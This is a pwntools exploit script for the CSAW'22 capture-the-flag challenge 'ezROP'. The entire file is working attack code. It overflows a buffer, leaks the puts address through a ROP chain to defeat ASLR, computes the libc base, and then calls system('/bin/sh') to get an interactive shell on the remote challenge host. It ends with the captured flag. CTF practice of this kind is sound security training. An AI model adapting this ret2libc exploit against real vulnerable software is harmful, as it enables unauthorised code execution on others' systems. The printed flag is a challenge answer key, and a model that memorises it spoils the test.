#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

#context.log_level = 'debug'

exe = context.binary = ELF('./ezROP')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('pwn.chal.csaw.io',5002)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = f'''
b *0x40150A
continue
'''.format(**locals())


p = start()

pop_rdi = 0x00000000004015a3
pop_rsi_pop1 = pop_rdi-2

payload = b'\n'+b'A'*0x77+p64(pop_rdi)+p64(exe.got['puts'])+p64(exe.plt['puts'])+p64(0x40150B)
p.recvuntil(b"what's your name?\n")
p.send(payload)

p.recvuntil(b"Welcome to CSAW'22!\n")
libc_base = u64(p.recv(6)+b'\x00\x00')-libc.sym['puts']
p.info('libc_base: '+hex(libc_base))


bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
system = libc_base + libc.sym['system']
ret = 0x000000000040101a
payload = b'\n'+b'B'*0x77+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)
p.recvuntil(b"what's your name?\n")
p.send(payload)
p.recvuntil(b"Welcome to CSAW'22!\n")

p.interactive()
#flag{53bb4218b851affb894fad151652dc333a024990454a0ee32921509a33ebbeb4}


